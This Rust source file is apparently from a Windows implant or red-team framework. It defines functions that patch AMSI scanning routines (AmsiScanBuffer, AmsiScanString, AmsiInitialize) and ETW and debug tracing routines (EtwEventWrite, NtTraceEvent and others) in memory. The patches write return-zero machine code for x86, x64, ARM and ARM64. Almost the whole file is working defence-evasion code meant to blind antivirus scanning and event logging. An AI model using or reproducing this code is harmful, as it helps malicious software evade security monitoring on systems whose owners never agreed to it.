// Copyright (C) 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#![no_implicit_prelude]
#![cfg(target_family = "windows")]

use crate::device::winapi::{self, amsi, kernel32, ntdll, Function, Handle, Region, Win32Error, Win32Result};
use crate::ignore_error;
use crate::prelude::*;

#[inline]
pub fn patch_asmi() -> Win32Result<()> {
    if !winapi::is_min_windows_10() {
        return Err(Win32Error::NotImplemented);
    }
    winapi::init_amsi();
    zero_patch(&amsi::AmsiInitialize)?;
    zero_patch(&amsi::AmsiScanBuffer)?;
    zero_patch(&amsi::AmsiScanString)
}
pub fn patch_tracing() -> Win32Result<()> {
    winapi::init_ntdll();
    winapi::init_kernel32();
    zero_patch(&ntdll::NtTraceEvent)?;
    zero_patch(&ntdll::DbgBreakPoint)?;
    zero_patch(&kernel32::DebugBreak)?;
    if !winapi::is_min_windows_vista() {
        return Ok(());
    }
    // NOTE(dij): These are only supported in Windows Vista and above.
    zero_patch(&ntdll::EtwEventWrite)?;
    zero_patch(&ntdll::EtwEventWriteFull)?;
    zero_patch(&ntdll::EtwEventRegister)?;
    zero_patch(&ntdll::EtwNotificationRegister)
}

fn zero_patch(func: &Function) -> Win32Result<()> {
    if !func.is_loaded() {
        return Err(Win32Error::InvalidAddress);
    }
    let f: Region = func.address().into();
    #[cfg(any(target_arch = "x86", target_arch = "x86_64"))]
    {
        // 0x40 - PAGE_EXECUTE_READWRITE
        let a = winapi::NtProtectVirtualMemory(winapi::CURRENT_PROCESS, f, 5, 0x40)?;
        let b = unsafe { f.as_slice_mut(5) };
        // xor rax, rax
        // ret
        b[0] = 0x48; // XOR
        b[1] = 0x33; // RAX
        b[2] = 0xC0; // RAX
        b[3] = 0xC3; // RET
        b[4] = 0xC3; // RET
        let r = winapi::NtProtectVirtualMemory(winapi::CURRENT_PROCESS, f, 5, a);
        ignore_error!(unsafe {
            winapi::syscall!(
                *ntdll::NtFlushInstructionCache,
                extern "stdcall" fn(Handle, Region, u32) -> u32,
                winapi::CURRENT_PROCESS,
                f,
                5
            )
        });
        r.map(|_| ())
    }
    #[cfg(any(target_arch = "aarch64", target_arch = "arm"))]
    {
        let a = winapi::NtProtectVirtualMemory(winapi::CURRENT_PROCESS, f, 8, 0x40)?;
        let b = unsafe { f.as_slice_mut(8) };
        #[cfg(target_arch = "arm")]
        {
            // mov r0,0
            // bx lr
            b[0] = 0x00;
            b[1] = 0x00;
            b[2] = 0xA0;
            b[3] = 0xE3;
            b[4] = 0x1E;
            b[5] = 0xFF;
            b[6] = 0x2F;
            b[7] = 0xE1;
        }
        #[cfg(target_arch = "aarch64")]
        {
            // mov x0,0
            // ret
            b[0] = 0x00;
            b[1] = 0x00;
            b[2] = 0x80;
            b[3] = 0xD2;
            b[4] = 0xC0;
            b[5] = 0x03;
            b[6] = 0x5F;
            b[7] = 0xD6;
        }
        let r = winapi::NtProtectVirtualMemory(winapi::CURRENT_PROCESS, f, 8, a);
        ignore_error!(unsafe {
            winapi::syscall!(
                *ntdll::NtFlushInstructionCache,
                extern "stdcall" fn(Handle, Region, u32) -> u32,
                winapi::CURRENT_PROCESS,
                f,
                8
            )
        });
        r.map(|_| ())
    }
}
